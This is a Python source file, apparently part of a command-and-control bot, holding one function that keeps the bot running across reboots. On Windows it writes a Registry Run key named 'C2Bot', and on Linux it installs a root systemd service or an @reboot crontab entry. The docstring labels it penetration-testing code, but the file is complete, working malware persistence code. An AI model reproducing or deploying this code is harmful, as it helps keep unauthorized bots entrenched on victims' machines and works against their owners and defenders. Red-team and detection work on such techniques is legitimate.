# bot/persistence.py
import os
import platform
import logging
import subprocess
import shlex

def add_persistence():
    """
    Add persistence mechanisms to maintain bot presence across reboots.
    
    SECURITY NOTE: This function uses platform-specific mechanisms:
    - Windows: Registry Run key for current user
    - Linux: Systemd or crontab (root for system-wide, user for per-user)
    
    IMPORTANT: This is intentionally dangerous code for penetration testing.
    Use only on systems you have explicit authorization to test.
    """
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            bot_path = os.path.abspath(__file__)
            
            try:
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "C2Bot", 0, winreg.REG_SZ, bot_path)
                    logging.info(f"Windows persistence added: {bot_path}")
            except PermissionError:
                logging.warning("Insufficient privileges for Windows persistence")
                
        elif platform.system() == "Linux":
            script_path = os.path.abspath(__file__)
            
            # Try systemd first (preferred method)
            if os.path.exists("/etc/systemd/system"):
                try:
                    service_content = f"""[Unit]
Description=C2 Bot Service
After=network.target

[Service]
Type=simple
User=root
ExecStart={script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
                    service_path = "/etc/systemd/system/c2bot.service"
                    if os.access("/etc/systemd/system", os.W_OK):
                        with open(service_path, "w") as f:
                            f.write(service_content)
                        subprocess.run(["systemctl", "daemon-reload"], check=False)
                        subprocess.run(["systemctl", "enable", "c2bot.service"], check=False)
                        logging.info("Linux systemd persistence added")
                        return
                except Exception as e:
                    logging.warning(f"Systemd persistence failed: {e}")
            
            # Fallback to crontab (safer than shell=True)
            try:
                # Check if crontab entry already exists
                result = subprocess.run(
                    ["crontab", "-l"],
                    capture_output=True,
                    text=True,
                    check=False
                )
                existing_crontab = result.stdout if result.returncode == 0 else ""
                
                # Build crontab entry
                cron_entry = f"@reboot {script_path}\n"
                
                # Only add if not already present
                if cron_entry.strip() not in existing_crontab:
                    new_crontab = existing_crontab + cron_entry
                    
                    # Use pipe to avoid shell injection
                    process = subprocess.Popen(
                        ["crontab", "-"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate(input=new_crontab)
                    
                    if process.returncode == 0:
                        logging.info("Linux crontab persistence added")
                    else:
                        logging.warning(f"Crontab persistence failed: {stderr}")
            except Exception as e:
                logging.warning(f"Crontab persistence failed: {e}")
                
    except Exception as e:
        logging.error(f"Error adding persistence: {e}")

